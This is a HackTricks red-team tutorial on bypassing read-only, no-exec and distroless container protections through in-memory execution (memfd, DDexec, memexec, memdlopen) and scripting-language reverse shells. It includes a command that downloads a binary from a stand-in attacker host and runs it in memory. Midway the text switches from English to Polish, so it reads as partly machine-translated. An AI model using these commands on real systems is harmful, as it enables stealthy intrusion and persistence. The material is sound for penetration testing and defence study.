# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_wymagana biegła znajomość języka polskiego w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec scenario

It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.

{% hint style="warning" %}
From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
{% endhint %}

## Easiest bypass: Scripts

Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.

However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.

## Memory Bypasses

If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.

### FD + exec syscall bypass

If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.

For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.

{% hint style="warning" %}
This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.

Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.

Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.

{% hint style="success" %}
**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to naturalny następny krok DDexec. To **DDexec shellcode demonizowane**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe pliki binarne do załadowania i uruchomienia**.

Możesz znaleźć przykład, jak użyć **memexec do wykonywania plików binarnych z odwróconego powłoki PHP** w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Z podobnym celem do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) umożliwia **łatwiejszy sposób ładowania plików binarnych** w pamięci, aby później je wykonać. Może nawet pozwolić na ładowanie plików binarnych z zależnościami.

## Distroless Bypass

### Co to jest distroless

Kontenery distroless zawierają tylko **najmniejsze niezbędne komponenty do uruchomienia konkretnej aplikacji lub usługi**, takie jak biblioteki i zależności uruchomieniowe, ale wykluczają większe komponenty, takie jak menedżer pakietów, powłoka czy narzędzia systemowe.

Celem kontenerów distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez eliminację niepotrzebnych komponentów** i minimalizację liczby podatności, które mogą być wykorzystane.

### Odwrócona powłoka

W kontenerze distroless możesz **nawet nie znaleźć `sh` ani `bash`**, aby uzyskać zwykłą powłokę. Nie znajdziesz również plików binarnych, takich jak `ls`, `whoami`, `id`... wszystko, co zwykle uruchamiasz w systemie.

{% hint style="warning" %}
Dlatego **nie będziesz** w stanie uzyskać **odwróconej powłoki** ani **enumerować** systemu, jak zwykle.
{% endhint %}

Jednak jeśli skompromitowany kontener uruchamia na przykład aplikację flask, to python jest zainstalowany, a zatem możesz uzyskać **odwróconą powłokę Pythona**. Jeśli działa node, możesz uzyskać odwróconą powłokę Node, i to samo z większością **języków skryptowych**.

{% hint style="success" %}
Używając języka skryptowego, możesz **enumerować system** korzystając z możliwości języka.
{% endhint %}

Jeśli nie ma **ochron `read-only/no-exec`**, możesz wykorzystać swoją odwróconą powłokę do **zapisywania w systemie plików swoich plików binarnych** i **wykonywania** ich.

{% hint style="success" %}
Jednak w tego rodzaju kontenerach te zabezpieczenia zazwyczaj istnieją, ale możesz użyć **wcześniejszych technik wykonania w pamięci, aby je obejść**.
{% endhint %}

Możesz znaleźć **przykłady** na to, jak **wykorzystać niektóre podatności RCE**, aby uzyskać odwrócone powłoki języków skryptowych i wykonywać pliki binarne z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
